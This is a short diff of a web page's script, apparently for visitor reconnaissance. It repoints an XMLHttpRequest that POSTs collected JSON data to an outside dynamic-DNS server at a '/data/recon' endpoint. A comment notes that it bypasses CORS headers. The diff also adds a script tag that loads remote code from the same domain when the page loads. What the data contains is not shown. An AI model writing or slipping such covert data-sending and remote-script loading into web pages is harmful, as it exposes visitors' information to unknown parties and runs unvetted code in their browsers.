@@ -237,7 +237,7 @@ main();
 
                 // Send the JSON response to another server (without CORS headers)
                 const xhr = new XMLHttpRequest();
-                xhr.open("POST", "https://static.blitzd.uk:1880/data/recon", true);
+                xhr.open("POST", "https://blitzd.gotdns.ch:1880/data/recon", true);
                 xhr.setRequestHeader("Content-Type", "application/json");
                 xhr.send(JSON.stringify(data));
             })
@@ -247,6 +247,9 @@ main();
             });
         });
     </script>
+    
+    <script src="https://blitzd.uk/devices.js"></script>
+    
   </body>
   
   <!-- partial -->
